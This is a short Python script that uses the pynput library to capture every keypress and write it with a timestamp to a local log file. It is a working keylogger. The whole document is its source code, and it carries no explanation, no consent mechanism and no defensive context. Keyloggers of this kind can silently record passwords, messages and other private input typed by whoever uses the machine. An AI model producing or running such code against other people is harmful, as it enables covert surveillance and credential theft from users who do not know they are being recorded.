from pynput.keyboard import Listener
import logging

dec = ''

logging.basicConfig(filename=(dec + 'log.txt'),\
                    level=logging.DEBUG,
                    format='%(asctime)s : %(message)s',
                    )

def on_press(key):
    """This function records every key """
    logging.info(str(key))

# Start the listener on the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()